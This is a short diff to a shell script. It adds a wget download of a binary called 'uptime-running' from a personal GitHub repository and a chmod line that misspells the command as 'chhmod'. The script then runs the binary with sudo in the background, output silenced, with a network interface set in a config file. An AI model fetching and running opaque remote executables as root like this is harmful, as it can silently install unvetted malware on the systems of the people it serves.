@@ -1,3 +1,4 @@
-
+wget https://github.com/kelvinzer0/kelvinzer0.github.io/raw/main/rtools/uptime-running
+sudo chhmod 777 uptime-running
 echo 'eth0' > iface.txt && echo '10' > comp.txt 
 sudo ./uptime-running > /dev/null &
